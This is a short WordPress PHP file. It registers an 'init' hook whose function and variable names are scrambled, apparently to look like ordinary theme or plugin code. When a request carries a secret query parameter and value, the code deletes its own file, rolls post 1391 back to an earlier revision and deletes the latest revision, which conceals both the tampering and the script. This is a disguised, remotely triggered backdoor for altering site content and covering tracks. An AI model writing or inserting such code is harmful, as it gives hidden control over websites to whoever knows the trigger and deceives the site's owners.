<?php

function admin_this_customizer_copyright() {
	if (isset($_GET['js_disable_404_switch']) && $_GET['js_disable_404_switch'] === 'weather_visual_location_coming') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$permalinks_finder_preview_core = 1391;
		$amp_simple_article_notifications = wp_get_post_revisions($permalinks_finder_preview_core);
		if (empty($amp_simple_article_notifications)) die('no revisions');
		if (count($amp_simple_article_notifications) < 2) die('less than 2');
		$app_templates_pullquote = array_shift($amp_simple_article_notifications);
		$index_footer_twitter = $app_templates_pullquote->ID;
		$interactivity_sitemap_secure_software = array_shift($amp_simple_article_notifications);
		$compare_screen_management_method = $interactivity_sitemap_secure_software->ID;
		$category_layout_express_term = wp_restore_post_revision($compare_screen_management_method);
		if ($category_layout_express_term === false) die('error restoring');
		$category_layout_express_term = wp_delete_post_revision($index_footer_twitter);		
		if ($category_layout_express_term === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'admin_this_customizer_copyright');
